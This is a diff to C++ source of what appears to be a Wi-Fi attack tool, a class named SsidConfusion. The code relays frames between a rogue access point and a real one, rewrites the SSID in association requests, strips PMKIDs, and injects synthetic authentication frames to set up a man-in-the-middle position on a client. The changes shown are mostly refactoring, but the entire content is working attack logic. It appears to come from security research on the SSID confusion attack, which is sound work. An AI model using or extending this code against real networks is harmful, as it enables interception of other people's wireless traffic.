@@ -13,9 +13,8 @@ void SsidConfusion::send_to_real(PDU &pdu) const {
 }
 
 void SsidConfusion::send_to_real(const frame_raw_t &raw) const {
-	auto translated = ensure_radiotap(raw);
-	translate_data_mac(translated, rogue_ap->get(SK::mac), ap->get(SK::mac));
-	sock_real->send(translated, netconfig.real_channel);
+	const auto full_radiotap = ensure_radiotap(raw);
+	sock_real->send(full_radiotap, netconfig.real_channel);
 }
 
 FrameProcess SsidConfusion::handle_probe(const HWAddress<6> addr2, const PDU *pdu, const Dot11 &dot11) {
@@ -73,20 +72,21 @@ FrameProcess SsidConfusion::handle_assoc_request(const HWAddress<6> &, Dot11 &do
 	if(!dot11.find_pdu<Dot11AssocRequest>() && !dot11.find_pdu<Dot11ReAssocRequest>())
 		return CONTINUE;
 
-	auto translated = ensure_radiotap(raw);
-	rewrite_ssid_in_frame(translated, "WrongNet"); //TODO hardcoded
-	if(strip_pmkid_in_assoc) strip_pmkid_from_rsn_ie(translated);
+	auto full_radiotap = ensure_radiotap(raw);
+	rewrite_ssid_in_frame(full_radiotap, "WrongNet"); //TODO hardcoded
+	if(strip_pmkid_in_assoc) strip_pmkid_from_rsn_ie(full_radiotap);
 
 	if(client_state.get_state() >= ClientState::Associated) {
 		// deduplicate L2 retransmissions: Retry bit set = same frame resent, real AP already got it
 		if(dot11.retry()) return STOP;
 		display_traffic(dot11, "Rogue channel", " -- AssocReq retry (relay to real)");
-		send_to_real(translated);
+		send_to_real(full_radiotap);
 		return STOP;
 	}
 
 	display_traffic(dot11, "Rogue channel", " -- MitMing (relay to real)");
 	client_state.update_state(ClientState::Associated);
+	//add_station_authorized(rogue_ap->get_ap_iface(), client_state.get_mac(), rogue_ap[SK::netns]);
 
 	// SME-mode clients (NL80211_CMD_CONNECT) skip explicit auth; inject synthetic open
 	// auth to real AP so it has authenticated state before the assoc arrives.
@@ -97,7 +97,7 @@ FrameProcess SsidConfusion::handle_assoc_request(const HWAddress<6> &, Dot11 &do
 	synth_auth.status_code(0);
 	send_to_real(synth_auth);
 
-	send_to_real(translated);
+	send_to_real(full_radiotap);
 	return STOP;
 }
 
@@ -135,9 +135,7 @@ void SsidConfusion::handle_rx_rogue_chan(const std::unique_ptr<PDU> &pdu, const 
 	}
 
 	if(addr2 == sta.get(SK::mac)) {
-		if(dot11->find_pdu<Dot11Beacon>()) return; // client_ack_vif beacon leak
-		if(dot11->find_pdu<Dot11Deauthentication>() || dot11->find_pdu<Dot11Disassoc>())
-			client_state.update_state(ClientState::Target_disconnected);
+		handle_disconnect_rogue(*dot11);
 		if(dot11->type() == Dot11::DATA &&
 		   client_state.get_state() >= ClientState::Associated &&
 		   client_state.get_state() < ClientState::GotMitm)
